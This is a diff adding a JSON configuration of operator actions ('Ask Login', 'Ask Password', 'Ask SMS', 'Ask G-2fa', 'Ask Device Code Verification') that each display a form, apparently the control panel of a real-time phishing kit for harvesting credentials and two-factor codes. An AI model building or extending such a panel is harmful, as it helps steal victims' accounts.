@@ -1,0 +1,74 @@
+[
+  {
+    "button": "Ask Login",
+    "title": "Login",
+    "init_fn": "ask_ask_login",
+    "id": "ask_login",
+    "sql_ms": "Operation `Ask Login` added successfully",
+    "success_mes": "Login form displayed",
+    "desc": "Some extra information",
+    "return_prop": "keys"
+  },
+  {
+    "button": "Ask Success",
+    "title": "Success",
+    "init_fn": "ask_suc",
+    "id": "suc",
+    "sql_ms": "Operation `Ask Success` added successfully",
+    "success_mes": "Success form displayed",
+    "desc": "Some extra information",
+    "return_prop": "keys"
+  },
+  {
+    "button": "Ask Password",
+    "title": "Password",
+    "init_fn": "ask_passw",
+    "id": "passw",
+    "sql_ms": "Operation `Ask Password` added successfully",
+    "success_mes": "Password form displayed",
+    "desc": "Some extra information",
+    "return_prop": "keys"
+  },
+  {
+    "button": "Ask SMS",
+    "title": "SMS",
+    "init_fn": "ask_sms",
+    "id": "sms",
+    "sql_ms": "Operation `Ask SMS` added successfully",
+    "success_mes": "SMS form displayed",
+    "desc": "Some extra information",
+    "return_prop": "keys",
+    "num": "xxxxxxx12"
+  },
+  {
+    "button": "Ask Call",
+    "title": "Call",
+    "init_fn": "ask_call",
+    "id": "call",
+    "sql_ms": "Operation `Ask Call` added successfully",
+    "success_mes": "Call form displayed",
+    "desc": "Some extra information",
+    "num": "xxxxxxx12"
+  },
+  {
+    "button": "Ask G-2fa",
+    "title": "G-2fa",
+    "init_fn": "ask_g2fa",
+    "id": "g2fa",
+    "sql_ms": "Operation `Ask G-2fa` added successfully",
+    "success_mes": "G-2fa form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask Device Code Verification",
+    "title": "Device Code Verification",
+    "init_fn": "ask_device",
+    "id": "device",
+    "sql_ms": "Operation `Ask Device Code Verification` added successfully",
+    "success_mes": "Device Code Verification form displayed",
+    "desc": "Some extra information",
+    "inputs": [
+      "num"
+    ]
+  }
+]
